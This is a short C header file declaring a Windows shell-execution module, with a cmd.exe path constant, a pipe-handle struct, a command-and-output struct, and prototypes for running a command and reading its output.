#include <windows.h>
#include "utils.h"

#define CMD_PATH "C:\\Windows\\System32\\cmd.exe"
#define CMD_ARG_LEN STRLEN("/c ")

#define EXEC_SHELL_FAILED -1

struct output_pipe
{
    HANDLE rd;
    HANDLE wr;
};

struct shell_cmd
{
    char *cmd;
    char out[8192];
    unsigned int cmd_len;
    long unsigned int exit_code;
};

void shell(struct shell_cmd *);
void init_shell_module();
int read_shell_output(void *, unsigned int);
